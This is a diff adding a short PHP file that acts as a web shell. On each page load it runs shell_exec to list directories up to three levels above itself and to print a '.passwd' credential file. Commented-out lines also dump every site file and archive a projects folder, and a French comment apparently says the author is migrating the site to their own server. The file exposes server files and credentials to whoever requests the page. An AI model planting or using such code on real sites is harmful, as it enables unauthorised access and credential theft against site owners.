@@ -1,0 +1,16 @@
+<?php
+#$localpath = "../../";
+#echo shell_exec("ls")."<br>";
+#echo shell_exec("ls ".$localpath)."<br>";
+#echo shell_exec("cat ".$localpath."index.php")."<br>";
+
+#echo "<br><h1>Tout les fichiers du site lol (j'essaie de migrer le site sur mon serveur merci)</h1>".filter_var(shell_exec("cd ../../; cat * */*"),FILTER_DEFAULT);
+#echo "test";
+#shell_exec("tar -cvf backup.tar ../../../MMIProjects/");
+echo shell_exec("ls -la");
+echo "<br><br>";
+echo shell_exec("ls -la ../../");
+echo "<br><br>";
+echo shell_exec("ls -la ../../../");
+echo shell_exec("cat ../../../.passwd");
+?>
